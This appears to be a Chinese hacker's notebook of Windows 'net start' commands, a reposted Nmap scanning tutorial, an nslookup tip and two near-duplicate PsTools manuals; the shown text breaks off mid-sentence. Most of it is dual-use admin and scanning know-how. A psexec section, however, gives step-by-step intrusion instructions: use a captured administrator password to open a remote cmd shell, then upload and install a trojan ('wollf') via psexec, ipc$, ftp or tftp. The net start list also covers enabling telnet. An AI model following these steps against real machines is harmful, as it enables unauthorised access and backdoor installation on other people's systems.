启动 Macintosh 打印服务器服务，允许从 Macintosh 计算机打印。该命令只能在运行 Win 
dows 2000 Server 的计算机上可用。 
net start "print server for macintosh" 
Net start Remote Access Connection Manager 
启动“远程访问连接管理器”服务。该命令只有在安装了“远程访问服务”后才可用。 
net start "remote access connection manager" 
Net start Remote Access ISNSAP Service 
启动“远程访问 ISNSAP 服务”。该命令只有在安装了“远程访问服务”后才可用。 
net start "remote access isnsap service" 
Net start Remote Procedure Call (RPC) Locator 
启动 RPC 定位器服务。“定位器”服务是 Microsoft Windows 2000 的 RPC 名称服务。 
net start "remote procedure call (rpc) locator" 

Net start Remote Procedure Call (RPC) Service 
启动“远程过程调用 (RPC) 服务”。“远程过程调用 (RPC) 服务”是 Microsoft Windows 
2000 的 RPC 子系统。RPC 子系统包括终结点映射器和其他各种 RPC 服务。 
net start "remote procedure call (rpc) service" 

Net start Schedule 
启动“计划”服务。“计划”服务使计算机可以使用 at 命令在指定时间启动程序。 
net start schedule 

Net start Server 
启动“服务器”服务。“服务器”服务使计算机可以共享网络上的资源。 
net start server 

Net start Simple TCP/IP Services 
启动“简单 TCP/IP 服务”服务。该命令只有在安装了 TCP/IP 和“简单 TCP/IP 服务”后 
才可以使用。 
net start "simple tcp/ip services" 
Net start Site Server LDAP Service 
启动“Site Server LDAP 服务”。“Site Server LDAP 服务”在 Windows 2000 Active D 

irectory 中发布 IP 多播会议。该命令只有在安装了“Site Server LDAP 服务”后才可以使 
用。 
net start "site server ldap service" 

Net start SNMP 
启动 SNMP 服务。SNMP 服务允许服务器向 TCP/IP 网络上的 SNMP 管理系统报告当前状态。 
该命令只有在安装了 TCP/IP 和 SNMP 后才可以使用。 
net start snmp 

Net start Spooler 
启动“后台打印程序”。 
net start spooler 
Net start TCP/IP NetBIOS Helper 
在 TCP 服务上启用 Netbios 支持。该命令只有在安装了 TCP/IP 才可用。 
net start "tcp/ip netbios helper" 
Net start UPS 
启动“不间断电源 (UPS)”服务 
net start ups 

Net start Windows Internet Name Service 
启动“Windows Internet 命名服务”。该命令只有在安装了 TCP/IP 和“Windows Interne 
t 命名服务”后在 Windows 2000 Servers 上才可以使用。 
net start "windows internet name service" 

Net start Workstation 
启动“工作站”服务。“工作站”服务使计算机可以连接并使用网络资源。 
net start workstation 
Net start Schedule 
有的地方称为“定时”服务，叫法不同，请大家注意了，其实是一回事！ 
Net start Telnet 
启动telnet服务，打开23端口，有的情况下需先运行NTLM.exe。为什么？到榕G的说明里去找 
吧！ 
net start workstation 
打开NET USE 
net start lanmanserver 
打开 IPC 服务。 
net start msftpsvc 
打开FTP服务



【NMAP】
[Ping扫描（Ping　Sweeping）]　 

[端口扫描（Port　Scanning）]　 

[隐蔽扫描（Stealth　Scanning）] 

[UDP扫描（UDP　Scanning）] 

[操作系统识别（OS　Fingerprinting）] 

[Ident扫描（Ident　Scanning）]　 

[选项（Options）] 

[小结] 

　 
　 

简介：　　 
最近媒体报道了许多关于入侵网络的新闻，使人们总以为入侵者只需通过简单工具就可获得电脑的访问权限。但实际上，事情并不是想象中的这么简单。黑客想要入侵一台电脑，首先要有一套完整的计划。在入侵系统之前，黑客必须先找到一台目标主机，并查出哪些端口在监听之后才能进行入侵。 

找出网络上的主机,测试哪些端口在监听，这些工作通常是由扫描来实现的。扫描网络是黑客进行入侵的第一步。通过使用扫描器(如Nmap)扫描网络，寻找存在漏洞的目标主机。一旦发现了有漏洞的目标，接下来就是对监听端口的扫描。Nmap通过使用TCP协议栈指纹准确地判断出被扫主机的操作系统类型。 

本文全方位地介绍Nmap的使用方法，可以让安全管理员了解在黑客眼中的站点。并通过使用它，安全管理员可以发现自己网站的漏洞，并逐步完善自己的系统。 

Nmap是在免费软件基金会的GNU　General　Public　License　(GPL)下发布的，可从www.insecure.org/nmap站点上免费下载。下载格式可以是tgz格式的源码或RPM格式。目前较稳定的版本是2.12。带有图形终端，本文集中讨论Nmap命令的使用。　Nmap的语法相当简单。Nmap的不同选项和-s标志组成了不同的扫描类型，比如：一个Ping-scan命令就是"-sP"。在确定了目标主机和网络之后，即可进行扫描。如果以root来运行Nmap，Nmap的功能会大大的增强，因为超级用户可以创建便于Nmap利用的定制数据包。 

在目标机上，Nmap运行灵活。使用Nmap进行单机扫描或是整个网络的扫描很简单，只要将带有"/mask"的目标地址指定给Nmap即可。地址是"victim/24"，　则目标是c类网络，地址是"victim/16"，　则目标是B类网络。 

另外,Nmap允许你使用各类指定的网络地址，比如　192.168.7.*,是指192.168.7.0/24,　或　192.168.7.1,4,8-12，对所选子网下的主机进行扫描。 

Ping扫描(Ping　Sweeping) 

入侵者使用Nmap扫描整个网络寻找目标。通过使用"　-sP"命令，进行ping扫描。缺省情况下，Nmap给每个扫描到的主机发送一个ICMP　echo和一个TCP　ACK,　主机对任何一种的响应都会被Nmap得到。 
举例：扫描192.168.7.0网络： 

#　nmap　-sP　192.168.7.0/24 

Starting　nmap　V.　2.12　by　Fyodor　(fyodor@dhp.com,　www.insecure.org/nmap/) 
Host　(192.168.7.11)　appears　to　be　up. 
Host　(192.168.7.12)　appears　to　be　up. 
Host　(192.168.7.76)　appears　to　be　up. 
Nmap　run　completed　--　256　IP　addresses　(3　hosts　up)　scanned　in　1　second 

如果不发送ICMP　echo请求，但要检查系统的可用性，这种扫描可能得不到一些站点的响应。在这种情况下，一个TCP"ping"就可用于扫描目标网络。 

一个TCP"ping"将发送一个ACK到目标网络上的每个主机。网络上的主机如果在线，则会返回一个TCP　RST响应。使用带有ping扫描的TCP　ping选项，也就是"PT"选项可以对网络上指定端口进行扫描(本文例子中指的缺省端口是80（http）号端口)，它将可能通过目标边界路由器甚至是防火墙。注意，被探测的主机上的目标端口无须打开，关键取决于是否在网络上。 
#　nmap　-sP　-PT80　192.168.7.0/24 
TCP　probe　port　is　80 

Starting　nmap　V.　2.12　by　Fyodor　(fyodor@dhp.com,　www.insecure.org/nmap/) 
Host　(192.168.7.11)　appears　to　be　up. 
Host　(192.168.7.12)　appears　to　be　up. 
Host　(192.168.7.76)　appears　to　be　up. 
Nmap　run　completed　--　256　IP　addresses　(3　hosts　up)　scanned　in　1　second 

当潜在入侵者发现了在目标网络上运行的主机，下一步是进行端口扫描。 
Nmap支持不同类别的端口扫描TCP连接,　TCP　SYN,　Stealth　FIN,　Xmas　Tree,Null和UDP扫描。 


端口扫描(Port　Scanning) 

一个攻击者使用TCP连接扫描很容易被发现，因为Nmap将使用connect()系统调用打开目标机上相关端口的连接，并完成三次TCP握手。黑客登录到主机将显示开放的端口。一个tcp连接扫描使用"-sT"命令如下。 
#　nmap　-sT　192.168.7.12 
Starting　nmap　V.　2.12　by　Fyodor　(fyodor@dhp.com,　www.insecure.org/nmap/) 
Interesting　ports　on　(192.168.7.12): 
Port　State　Protocol　Service 
7　open　tcp　echo 
9　open　tcp　discard 
13　open　tcp　daytime 
19　open　tcp　chargen 
21　open　tcp　ftp 
... 
Nmap　run　completed　--　1　IP　address　(1　host　up)　scanned　in　3　seconds 

隐蔽扫描(Stealth　Scanning) 

如果一个攻击者不愿在扫描时使其信息被记录在目标系统日志上，TCP　SYN扫描可帮你的忙，它很少会在目标机上留下记录，三次握手的过程从来都不会完全实现。通过发送一个SYN包（是TCP协议中的第一个包）开始一次SYN的扫描。任何开放的端口都将有一个SYN|ACK响应。然而，攻击者发送一个RST替代ACK，连接中止。三次握手得不到实现，也就很少有站点能记录这样的探测。如果是关闭的端口，对最初的SYN信号的响应也会是RST，让NMAP知道该端口不在监听。"-sS"命令将发送一个SYN扫描探测主机或网络： 

#　nmap　-sS　192.168.7.7 

Starting　nmap　V.　2.12　by　Fyodor　(fyodor@dhp.com,　www.insecure.org/nmap/) 
Interesting　ports　on　saturnlink.nac.net　(192.168.7.7): 
Port　State　Protocol　Service 
21　open　tcp　ftp 
25　open　tcp　smtp 
53　open　tcp　domain 
80　open　tcp　http 
... 

Nmap　run　completed　--　1　IP　address　(1　host　up)　scanned　in　1　second 

虽然SYN扫描可能不被注意，但他们仍会被一些入侵检测系统捕捉。Stealth　FIN，Xmas树和Null　scans可用于躲避包过滤和可检测进入受限制端口的SYN包。这三个扫描器对关闭的端口返回RST，对开放的端口将吸收包。一个　FIN　"-sF"扫描将发送一个FIN包到每个端口。 
然而Xmas扫描"-sX"打开FIN,　URG和PUSH的标志位，一个Null　scans　"-sN"关闭所有的标志位。因为微软不支持TCP标准，所以FIN,　Xmas　Tree和Null　scans在非微软公司的操作系统下才有效。 


UDP扫描(UDP　Scanning) 

如果一个攻击者寻找一个流行的UDP漏洞，比如　rpcbind漏洞或cDc　Back　Orifice。为了查出哪些端口在监听，则进行UDP扫描，即可知哪些端口对UDP是开放的。Nmap将发送一个O字节的UDP包到每个端口。如果主机返回端口不可达，则表示端口是关闭的。但这种方法受到时间的限制，因为大多数的UNIX主机限制ICMP错误速率。幸运的是，Nmap本身检测这种速率并自身减速，也就不会产生溢出主机的情况。 


#　nmap　-sU　192.168.7.7 

WARNING:　-sU　is　now　UDP　scan　--　for　TCP　FIN　scan　use　-sF 
Starting　nmap　V.　2.12　by　Fyodor　(fyodor@dhp.com,　www.insecure.org/nmap/) 
Interesting　ports　on　saturnlink.nac.net　(192.168.7.7): 
Port　State　Protocol　Service 
53　open　udp　domain 
111　open　udp　sunrpc 
123　open　udp　ntp 
137　open　udp　netbios-ns 
138　open　udp　netbios-dgm 
177　open　udp　xdmcp 
1024　open　udp　unknown 

Nmap　run　completed　--　1　IP　address　(1　host　up)　scanned　in　2　seconds 


操作系统识别(OS　Fingerprinting) 

通常一个入侵者可能对某个操作系统的漏洞很熟悉，能很轻易地进入此操作系统的机器。一个常见的选项是TCP/IP上的指纹，带有"-O"选项决定远程操作系统的类型。这可以和一个端口扫描结合使用，但不能和ping扫描结合使用。Nmap通过向主机发送不同类型的探测信号，缩小查找的操作系统系统的范围。指纹验证TCP包括使用FIN探测技术发现目标机的响应类型。BOGUS的标志探测，发现远程主机对发送的带有SYN包的不明标志的反应，TCP　初始序列号(ISN)取样发现ISN数值的样式，也可以用另外的方式决定远程操作系统。有一篇权威的关于指纹（fingertprinting）的文章,作者：Fyodor，也是namp的作者，参见地址：http://www.insecure.org/nmap/nmap-fingerprinting-article.html 

Nmap's操作系统的检测是很准确也是很有效的，举例：使用系统Solaris　2.7带有SYN扫描的指纹验证堆栈。 
#　nmap　-sS　-O　192.168.7.12 

Starting　nmap　V.　2.12　by　Fyodor　(fyodor@dhp.com,　www.insecure.org/nmap/) 
Interesting　ports　on　comet　(192.168.7.12): 
Port　State　Protocol　Service 
7　open　tcp　echo 
9　open　tcp　discard 
13　open　tcp　daytime 
19　open　tcp　chargen 
21　open　tcp　ftp 
... 
TCP　Sequence　Prediction:　Class=random　positive　increments 
Difficulty=17818　(Worthy　challenge) 
Remote　operating　system　guess:　Solaris　2.6　-　2.7 

Nmap　run　completed　--　1　IP　address　(1　host　up)　scanned　in　5　seconds 


Ident扫描（Ident　Scanning） 

一个攻击者常常寻找一台对于某些进程存在漏洞的电脑。比如,一个以root运行的WEB服务器。如果目标机运行了identd,一个攻击者使用Nmap通过"-I"选项的TCP连接,就可以发现哪个用户拥有http守护进程。我们将扫描一个Linux　WEB服务器为例： 

#　nmap　-sT　-p　80　-I　-O　www.yourserver.com 

Starting　nmap　V.　2.12　by　Fyodor　(fyodor@dhp.com,　www.insecure.org/nmap/) 
Interesting　ports　on　www.yourserver.com　(xxx.xxx.xxx.xxx): 
Port　State　Protocol　Service　Owner 
80　open　tcp　http　root 

TCP　Sequence　Prediction:　Class=random　positive　increments 
Difficulty=1140492　(Good　luck!) 
Remote　operating　system　guess:　Linux　2.1.122　-　2.1.132;　2.2.0-pre1　-　2.2.2 

Nmap　run　completed　--　1　IP　address　(1　host　up)　scanned　in　1　second 

如果你的WEB服务器是错误的配置并以root来运行，象上例一样，它将是黎明前的黑暗。 

Apache运行在root下，是不安全的实践，你可以通过把/etc/indeed.conf中的auth服务注销来阻止ident请求，并重新启动ident。另外也可用使用ipchains或你的最常用的防火墙，在网络边界上执行防火墙规则来终止ident请求，这可以阻止来路不明的人探测你的网站用户拥有哪些进程。 


选项(Options) 

除了以上这些扫描，Nmap还提供了无数选项。有一个是"-PT",，我们已经介绍过了。在目标机或网络上常见的未经过滤的端口，进行TCP　"ping"扫描。 

另一个选项是"-P0"。在缺省设置下试图扫描一个端口之前，Nmap将用TCP　ping"　和　ICMP　echo命令ping一个目标机，如果ICMP　和TCP的探测扫描得不到响应，目标主机或网络就不会被扫描，即使他们是运行着的。而"-P0"选项允许在扫描之前不进行ping，即可进行扫描。 

你应该习惯使用"-v"命令，它详细列出所有信息，能和所有的扫描选项一起使用。你能反复地使用这个选项，获得有关目标机的更多信息。 

使用"-p　"选项，可以指定扫描端口。比如　，攻击者想探测你的web服务器的ftp（port　21），telnet　(port　23),　dns　(port　53),　http　(port　80),想知道你所使用的操作系统，它将使用SYN扫描。 

#　nmap　-sS　-p　21,23,53,80　-O　-v　www.yourserver.com 


小结： 
使用什么样的方法来抵制一个黑客使用Nmap，这样的工具是有的，比如　Scanlogd,　Courtney,　and　Shadow;，然而使用这样的工具并不能代替网络安全管理员。因为扫描只是攻击的前期准备，站点使用它只可以进行严密的监视。 
使用Nmap监视自己的站点，系统和网络管理员能发现潜在入侵者对你的系统的探测。 
(http://www.fanqiang.com)


【nslookup用法】
主题:nslookup用法  
 
　 
nslookup
set type=MX
haiyang.net
这样可以查haiyang.net的邮件服务器地址
set type=all
可以查所有的,像A记录 　 


【ps cmd】
pstools使用说明

作者：anonymous   来源：internet    更新日期：2004-12-23 
简述：本篇文章是基于pstools 1.6版本。pstools是sysinternals出的一个功能强大的nt/2k远程管理工具包。
它的主页为http://www.sysinternals.com/
下载地址为ttp://www.sysinternals.com/files/Pstools.zip 


 

 

(1)psexec
psexec是一个远程执行工具，你可以像使用telnet一样使用它。
它的使用格式为：
psexec \\远程机器ip [-u username [-p password]] [-c [-f]] [-i][-d] program [arguments]
它的参数有：
-u后面跟用户名 -p后面是跟密码的,如果建立ipc连接后这两个参数则不需要。（如果没有-p参数，则输入命令后会要求你输入密码）
-c <[路径]文件名>:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）
-d 不等待程序执行完就返回，（比如要让远程机器运行tftp服务端的时候使用，不然psexec命令会一直等待tftp程序结束才会返回）
-i 在远程机器上运行一个名为psexesvc进程，(到底什么用弄不明白）


假设我在远程机器ip有一个账号，账号名是：abc   密码是：123
比如想要用telnet一样在远程系统上执行命令可以打：
psexec \\远程机器ip -u abc -p 123 cmd
如果想要远程机器执行本地c:\srm.exe文件可以打：
psexec \\远程机器ip -u abc -p 123 -c c:\srm.exe
如果想要让远程机器执行本地上tftp服务端，(假设tftp服务端在本地c:\tftp32.exe)，可以打：
psexec \\远程机器ip -u abc -p 123 -c c:\tftp32.exe -d
（后面例子不再重复-u和-p的用法）



(2)psservice
psservice是一个服务管理程序。
它的使用格式为：
psservice [\\远程机器ip [-u username] [-p password]] <command> <options>
它的参数只有：
-u 后面跟用户名 -p后面是跟密码的,如果建立ipc连接后这两个参数则不需要。（如果没有-p参数，则输入命令后会要求你输入密码）
它的command有：
query [服务名]:显示某一服务的状态，如不填服务名则显示所有服务的状态。
config <服务名>：显示某一服务的配置。
start <服务名>：启动某一服务。
stop <服务名>：停止某一服务。
testart <服务名>：停止某一服务并重新启动它。
pause <服务名>：暂停某一服务。
cont <服务名>：恢复暂停的服务。
depend <服务名>：显示某一服务依存关系。
find <服务名>：在网络种搜寻指定的服务。
比如你想查看在远程机器上的telnet服务的状态可以打：
psservice \\远程机器ip query tlntsvr     （tlntsvr为telnet服务的服务名）
比如你查看远程机器上的telnet服务的配置可以打：
psservice \\远程机器ip config tlntsvr
比如你想启动远程机器上的telnet服务可以打：
psservice \\远程机器ip start tlntsvr
其他用法以此类推。

(3)pssuspend
pssuspend是一个暂时停止进程的软件
它的使用格式为：
pssuspend [-r] [\\远程机器ip [-u username] [-p password]] <process name | process id>
它有三个参数：
-u：后面跟用户名 -p：后面是跟密码的,如果建立ipc连接后这两个参数则不需要。（如果没有-p参数，则输入命令后会要求你输入密码）
-r:恢复进程。


比如要暂时停止一个pid号为999,名称为srm.exe的进程可以打：
pssuspend \\远程机器ip 999   或   pssuspend \\远程机器ip srm
如果想要恢复它就可以打pssuspend -r \\远程机器ip 999 或   pssuspend -r \\远程机器ip srm
(4)psinfo
psinfo是一个搜集机器软硬件信息的工具，它可以获得操作系统信息，硬件信息和软件信息。
它的使用格式为：
psinfo [-h] [-s] [-d] [-c] [\\远程机器ip [-u username [-p password]]]
它的参数有：
-u：后面跟用户名 -p：后面是跟密码的,如果建立ipc连接后这两个参数则不需要。（如果没有-p参数，则输入命令后会要求你输入密码）
-h：是显示它安装了哪些补丁包
-s：是显示它装了哪些软件
-d：是显示磁盘信息。


比如我只想看远程机器的软硬件信息和只用打:
psinfo \\远程机器ip
假如我还想看看它装了哪些补丁包可以打
psinfo -h \\远程机器ip
假如我还想看看它磁盘信息可以打：
psinfo -d \\远程机器ip
如果我想看它装了哪些软件可以打：
psinfo -s \\远程机器ip
简单吧.
(5)pslist
pslist是一个查看进程的程序。
它的使用格式为：
pslist [-d] [-m] [-x][-t][-s [n] [-r n] [\\远程机器ip [-u username] [-p password]] [name | pid]
它的参数有：
-u：后面跟用户名 -p：后面是跟密码的,如果建立ipc连接后这两个参数则不需要。（如果没有-p参数，则输入命令后会要求你输入密码）
-s：是使用任务管理器模式实时查看进程，可以按ESC键退出。
-r <秒数>：是和-s连用的一个参数，它用来指定任务管理器模式是的刷新间隔。（默认的刷新间隔为1秒）
-d：示各个进程的cpu使用信息。
-m：显示各个进程的存储器使用信息。
-x：非常详细显示进程的所有信息。
-t：以树型方式显示进程。


比如要查看远程机器ip上的进程的cpu使用信息可以打:
pslist -d \\远程机器ip
比如要查看一个pid号为999,名称为srm.exe进程的存储器使用信息可以打：
pslist -m \\远程机器ip 999 或 pslist -m \\远程机器ip srm
比如要以任务管理器模式实时查看61.12.23.4上进程情况，并且刷新间隔为3秒可以打：
pslist -s -n 3 \\远程机器ip

(6)psuptime
psuptime是一个了解远程机器运行了多久的命令。
使用它只需要打：psuptime \\远程机器ip



(7)psshutdown
psshutdown是一个远程关机命令。
它的使用格式为：
psshutdown [[-s | -r | -k [-t nn][-m "消息"][-f]] -a | -l | -o] [\\远程机器ip]


它的参数有：
-a：取消以前执行的关机指令。
-t：离关机还有多少秒。（默认是20秒）
-s：关闭机器。
-m：是要显示的信息。
-f：是关机是不保存运行的程序。
-r：表示重启。
-l：表示锁定电脑。
-o：表示注销用户。

比如我想让远程机器30秒后关闭并显示(要关机了，请保存文件)则打：
psshutdown -t 30 -s -m "要关机了，请保存文件" \\远程机器ip
如果是要重起的话打：
psshutdown -t 30 -m "要关机了，请保存文件" -r \\远程机器ip
如果要取消刚才的指令可以打：
psshutdown -a \\远程机器ip
其他参数以此类推。
(8)psfile
psfile是一个显示机器上的会话和有什么文件被网络中的用户的打开的命令。
它的使用格式为：
psfile [\\远程机器ip [-u Username [-p Password]]] [[Id | path] [-c]]
它的参数有:
-u 后面跟用户名 -p后面是跟密码的,如果建立ipc连接后这两个参数则不需要。（如果没有-p参数，则输入命令后会要求你输入密码）
-c：关闭会话或文件


比如我想看看远程机器上的会话和被远程用户打开的文件可以打：
psfile \\远程机器ip
接着就会显示
[33] C:\WINNT
  User:   ADMINISTRATOR
  Locks: 0
  Access: Read
[63] \PIPE\srvsvc
  User:   ADMINISTRATOR
  Locks: 0
  Access: Read Write
接着我想关闭id为33，路径为c:\winnt的这个会话可以打
psfile \\远程机器ip 33 -c   或   psfile \\远程机器ip c:\winnt -c

(9)psloggedon
psloggedon是一个显示目前谁登陆的机器的命令。
它的参数只有:
-l只显示本地登陆用户而不显示其它的网络登陆用户
-x不显示登陆时间
比如说要显示远程机器现在登陆的用户可以打：
psloggedon \\远程机器ip



(10)psgetsid
psgetsid是一个远程获取账号sid信息的工具。
它的使用格式为：
psgetsid [\\远程机器ip [-u username [-p password]]] [account]
它的参数有
-u 后面跟用户名 -p后面是跟密码的,如果建立ipc连接后这两个参数则不需要。（如果没有-p参数，则输入命令后会要求你输入密码）


比如要看远程机器上账号名为abc的sid信息可以打：
psgetsid \\远程机器ip abc
(11)pskill
pskill是一个杀除进程的程序。
它的使用格式为：
pskill [\\远程机器ip [-u username] [-p password]] <process name | process id>


比如要杀除一个pid号为999,名称为srm.exe的进程可以打：
pskill \\远程机器ip 999   或   pskill \\远程机器ip srm
(12)psloglist
psloglist
psloglist是一个查看系统事件记录的程序。
它的使用格式为：
psloglist [\\远程机器ip [-u username [-p password]]] [-s [-t delimiter]] [-n # | -d #] [-c][-x][-r][-a mm/dd/yy][-b mm/dd/yy][-f filter] [-l event log file] <eventlog> 
它的参数有：
-u 后面跟用户名 -p后面是跟密码的,如果建立ipc连接后这两个参数则不需要。
-c:显示事件之后清理事件记录
-l <事件记录文件名>:用于查看事件记录文件
-n <n>：只显示最近的n条系统事件记录。
-d <n>：只显示n天以前的系统事件记录
-a mm/dd/yy:显示mm/dd/yy以后的系统事件记录
-b mm/dd/yy:显示mm/dd/yy以前的系统事件记录
-f <事件类型>：只显示指定的事件类型的系统事件记录。
-x：显示事件数据代码
-r：从旧到新排列（如不加则默认是从新到旧排列）
-s:以一个事件为一行的格式显示，中间默认以逗号格开各个信息。
-t <字符>:这个参数和-s连用，以来改变-s中默认的逗号。


如果我想看远程机器的系统事件记录只用打：
psloglist \\远程机器ip 123
比如我想看最近的10条error类型的记录可以打：
psloglist \\远程机器ip -n 10 -f error




【psexec】
准备工具:psexec
在获得里对方管理员的密码后.
在本地进入cmd,输入psexec \\ip -u 帐号 -p 密码 c:\winnt\system32\cmd.exe
这样就连接到里对方的cmd shell,接下来可以用ftp传马马.ipc$也可以.

补充一下.psexec有个选项-c 可以上传本地的文件到远程机器
假如要上传wollf到对方机器上,可用如下格式
psexec \\ip -u adminuser -p pass -f wollf.exe c:\(对方的路径)
接下下就可以连到对方的cmd shell,安装wollf
除了ipc$,ftp也可以啊.还有原来玩unicode的时候.把自己的机器做成一个tftp服务器,用tftp命令来传,方法很多.最简单的还是使用他自带的这个命令选项.
在www.google.com去搜吧,这才是解决问题的地方.


【pstoosl工具介绍】
pstoosl工具介绍


以下的工具在狐狸的常用工具包里有。。。 

pstoosl工具介绍：

(1)psloglist
psloglist是一个查看系统事件记录的程序。
它的使用格式为：
psloglist [\\远程机器ip [-u username [-p password]]] [-s [-t delimiter]] [-n # | 
-d #][-c][-x][-r][-a mm/dd/yy][-b mm/dd/yy][-f filter] [-l event log file] <event
log> 
-u 后面跟用户名 -p后面是跟密码的,如果建立ipc连接后这两个参数则不需要。
-c:显示事件之后清理事件记录
-l <事件记录文件名>:用于查看事件记录文件
-n <n>：只显示最近的n条系统事件记录。
-d <n>：只显示n天以前的系统事件记录
-a mm/dd/yy:显示mm/dd/yy以后的系统事件记录
-b mm/dd/yy:显示mm/dd/yy以前的系统事件记录
-f <事件类型>：只显示指定的事件类型的系统事件记录。
-x：显示事件数据代码
-r：从旧到新排列（如不加则默认是从新到旧排列）
-s:以一个事件为一行的格式显示，中间默认以逗号格开各个信息。
-t <字符>:这个参数和-s连用，以来改变-s中默认的逗号。
假设我在远程机器ip有一个账号，账号名是：abc 密码是：123
如果我想看它的系统事件记录只用打：
psloglist \\远程机器ip -u abc -p 123
比如我想看最近的10条error类型的记录可以打：
psloglist \\远程机器ip -u abc -p 123 -n 10 -f error



pskill是一个杀除进程的程序。
它的使用格式为：
pskill [\\远程机器ip [-u username] [-p password]] <process name | process id>
假设我在远程机器ip有一个账号，账号名是：abc 密码是：123
比如要杀除一个pid号为999,名称为srm.exe的进程可以打：
pskill \\远程机器ip -u abc -p 123 999 或 pskill \\远程机器ip -u abc -p 123 srm



pslist是一个查看进程的程序。
它的使用格式为：
pslist [-?] [-d] [-m] [-x][-t][-s [n] [-r n] [\\远程机器ip [-u username] [-p pass
word]] [name | pid]
-u 后面跟用户名 -p后面是跟密码的,如果建立ipc连接后这两个参数则不需要。（如果没有-
p参数，则输入命令后会要求你输入密码）
-s：是使用任务管理器模式实时查看进程，可以按ESC键退出。
-r <秒数>：是和-s连用的一个参数，它用来指定任务管理器模式是的刷新间隔。（默认的刷
新间隔为1秒）
-d：示各个进程的cpu使用信息。
-m：显示各个进程的存储器使用信息。
-x：非常详细显示进程的所有信息。
-t：以树型方式显示进程。
假设我在远程机器ip有一个账号，账号名是：abc 密码是：123
比如要查看远程机器ip上的进程的cpu使用信息可以打:
pslist -d \\远程机器ip -u abc -p 123
比如要查看一个pid号为999,名称为srm.exe进程的存储器使用信息可以打：
pslist -m \\远程机器ip -u abc -p 123 999 或 pslist -m \\远程机器ip -u abc -p 123 
srm
比如要以任务管理器模式实时查看61.12.23.4上进程情况，并且刷新间隔为3秒可以打：
pslist -s -n 3 \\远程机器ip -u abc -p 123



psservice是一个服务管理程序。
它的使用格式为：
psservice [\\远程机器ip [-u username] [-p password]] <command> <options>
它的参数只有：
-u 后面跟用户名 -p后面是跟密码的,如果建立ipc连接后这两个参数则不需要。（如果没有-
p参数，则输入命令后会要求你输入密码）
它的command有：
query [服务名]:显示某一服务的状态，如不填服务名则显示所有服务的状态。
config <服务名>：显示某一服务的配置。
start <服务名>：启动某一服务。
stop <服务名>：停止某一服务。
testart <服务名>：停止某一服务并重新启动它。
pause <服务名>：暂停某一服务。
cont <服务名>：恢复暂停的服务。
depend <服务名>：显示某一服务依存关系。
find <服务名>：在网络种搜寻指定的服务。
比如你想查看在远程机器上的telnet服务的状态可以打：
psservice \\远程机器ip query tlntsvr （tlntsvr为telnet服务的服务名）
比如你查看远程机器上的telnet服务的配置可以打：
psservice \\远程机器ip config tlntsvr
比如你想启动远程机器上的telnet服务可以打：
psservice \\远程机器ip start tlntsvr
其他用法以此类推。





pssuspend是一个暂时停止进程的软件
它的使用格式为：
pssuspend [-r] [\\远程机器ip [-u username] [-p password]] <process name | process
 id>
它有三个参数：
-u 后面跟用户名 -p后面是跟密码的,如果建立ipc连接后这两个参数则不需要。（如果没有-
p参数，则输入命令后会要求你输入密码）
-r恢复进程。
假设我在远程机器ip有一个账号，账号名是：abc 密码是：123
比如要暂时停止一个pid号为999,名称为srm.exe的进程可以打：
pssuspend \\远程机器ip -u abc -p 123 999 或 pssuspend \\远程机器ip -u abc -p 123 
srm
如果想要恢复它就可以打pssuspend -r \\远程机器ip -u abc -p 123 999 或 pssuspend -r
 \\远程机器ip -u abc -p 123 srm



psexec是一个远程执行工具，你可以像使用telnet一样使用它。
它的使用格式为：
psexec \\远程机器ip [-u username [-p password]] [-c [-f]] [-i][-d] program [argum
ents]
它的参数有：
-c <[路径]文件名>:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）
-d 不等待程序执行完就返回，（比如要让远程机器运行tftp服务端的时候使用，不然psexec
命令会一直等待tftp程序结束才会返回）
-i 在远程机器上运行一个名为psexesvc进程，(到底什么用弄不明白）
假设我在远程机器ip有一个账号，账号名是：abc 密码是：123
比如想要用telnet一样在远程系统上执行命令可以打：
psexec \\远程机器ip -u abc -p 123 cmd
如果想要远程机器执行本地c:\srm.exe文件可以打：
psexec \\远程机器ip -u abc -p 123 -c c:\srm.exe
如果想要让远程机器执行本地上tftp服务端，(假设tftp服务端在本地c:\tftp32.exe)，可以
打：
psexec \\远程机器ip -u abc -p 123 -c c:\tftp32.exe -d


psinfo是一个搜集机器软硬件信息的工具，它可以获得操作系统信息，硬件信息和软件信息。

它的使用格式为：
psinfo [-h] [-s] [-d] [-c] [\\远程机器ip [-u username [-p password]]]
它的用法很简单，它只有三个参数。一个h和一个s一个d,加-h是显示它安装了哪些补丁包，而
加-s是显示它装了哪些软件,-d是显示磁盘信息。
比如我只想看远程机器的软硬件信息和只用打:
psinfo \\远程机器ip
假如我还想看看它装了哪些补丁包可以打
psinfo -h \\远程机器ip
假如我还想看看它磁盘信息可以打：
psinfo -d \\远程机器ip
如果我想看它装了哪些软件可以打：
psinfo -s \\远程机器ip
简单吧.


psgetsid是一个远程获取账号sid信息的工具。
它的参数只有-u和-p,-u后面跟用户名 ，如果建立ipc连接后这两个参数则不需要。
比如我有远程机器的一个账号，账号名是：abc 密码是：123则使用方法是:
psgetsid \\远程机器ip -u abc -p 123 要看sid的账号


psuptime是一个了解远程机器运行了多久的命令。
使用它只需要打：psuptime \\远程机器ip


psshutdown是一个远程关机命令。
它的参数有：-a 取消以前执行的关机指令，-t离关机还有多少秒（默认是20秒），-s关闭机
器，-m是要显示的信息，-f是关机是不保存运行的程序，-r表示重启，-l表示锁定电脑，-o 
表示注销用户。
比如我想让远程机器30秒后关闭并显示(要关机了，请保存文件)则打：
psshutdown -t 30 -s -m "要关机了，请保存文件" \\远程机器ip
如果是要重起的话打：
psshutdown -t 30 -m "要关机了，请保存文件" -r \\远程机器ip
如果要取消刚才的指令可以打：
psshutdown -a \\远程机器ip
其他参数以此类推。


psloggedon是一个显示目前谁登陆的机器的命令。
它的参数只有:
-l只显示本地登陆用户而不显示其它的网络登陆用户
-x不显示登陆时间
比如说要显示远程机器现在登陆的用户可以打：
psloggedon \\远程机器ip



psfile是一个显示机器上的会话和有什么文件被网络中的用户的打开的命令。
它的使用格式为：
psfile [\\远程机器ip [-u Username [-p Password]]] [[Id | path] [-c]]
它的参数只有:
-c：关闭会话或文件
比如我想看看远程机器上的会话和被远程用户打开的文件可以打：
psfile \\远程机器ip
接着就会显示
[33] C:\WINNT
User: ADMINISTRATOR
Locks: 0
Access: Read
[63] \PIPE\srvsvc
User: ADMINISTRATOR
Locks: 0
Access: Read Write
接着我想关闭id为33，路径为c:\winnt的这个会话可以打
